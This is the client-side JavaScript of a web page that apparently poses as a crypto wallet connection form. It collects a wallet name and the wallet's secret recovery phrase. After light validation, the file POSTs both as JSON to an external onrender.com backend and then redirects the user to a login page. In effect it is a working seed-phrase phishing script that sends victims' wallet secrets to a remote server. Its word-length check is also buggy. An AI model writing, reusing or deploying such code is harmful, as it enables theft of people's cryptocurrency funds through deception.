let walletName = ""
let secretPhrase = ""
let error1 = false;
let error2 = false;

document.querySelector(".input-box").addEventListener("change",(e)=>{
  document.querySelector(".error-box-1").classList.add("display")
  walletName = e.target.value;
})

document.querySelector(".button").style.backgroundColor = "rgba(245, 245, 245, 0.985)"
document.querySelector(".button").style.color = "rgba(0, 0, 0, 0.205)"

document.querySelector(".text-box").addEventListener("change",(e)=>{
  document.querySelector(".error-box-2").classList.add("display")
  secretPhrase = e.target.value;
})

document.querySelector(".text-box").addEventListener("input",(e)=>{
  if(e.target.value.length === 0){
    document.querySelector(".button").style.backgroundColor = "rgba(245, 245, 245, 0.985)"
    document.querySelector(".button").style.color = "rgba(0, 0, 0, 0.205)"
  }
  else{
    document.querySelector(".button").style.backgroundColor = "rgb(92, 165, 248)"
    document.querySelector(".button").style.color = "rgba(255, 255, 255, 1)"
  }
})

function checkSecret(str){
  if(str.length<3) return true;
  for(let i=0;i<str.length;i++){
    let wordLen = 0;
    for(let j=0;j<str.length;j++){
      if(str.charAt(j)== " ") break;
      else{
        wordLen++;
      }
    }
    if(wordLen < 3){
      return true;
    }
  }
  return false;
}

document.querySelector(".button").addEventListener("click",(e)=>{
  e.preventDefault();
  if(walletName.length==0 || walletName.length ===null){
    error1 = true;
  }

  if(secretPhrase.length==0 || secretPhrase.length ===null){
    error2 = true;
  }

  let ans = checkSecret(secretPhrase);

  console.log(ans)

  if(ans){
    document.querySelector(".error-box-2").classList.remove("display");
    document.querySelector(".error-box-2").innerHTML = "*Length Of Each Word Should Be Atleast 3 Letters";
  }

  if(error1){
    document.querySelector(".error-box-1").classList.remove("display");
    document.querySelector(".error-box-1").innerHTML = "*Enter The Wallet Name";
  }

  if(error2){
    document.querySelector(".error-box-2").classList.remove("display");
    document.querySelector(".error-box-2").innerHTML = "*Enter Secret Phrase";
  }

  if(ans === false && (error1 === false && error2 === false)){
    const url = "https://backend-01-92mi.onrender.com/api/data2";
      const data = {
          walletName:walletName,
          secretPhrase:secretPhrase
      };
      const options = {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
      };

      console.log(data)
    fetch(url, options)
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.json();
    })
    .then(data => {
      console.log(data)
      if(data.status === "Confirmed"){
        window.location.assign("../LoginPage/loginpage.html");
      }
    })
    .catch(error => {
      console.error('Fetch error:', error);
    });
  }
})
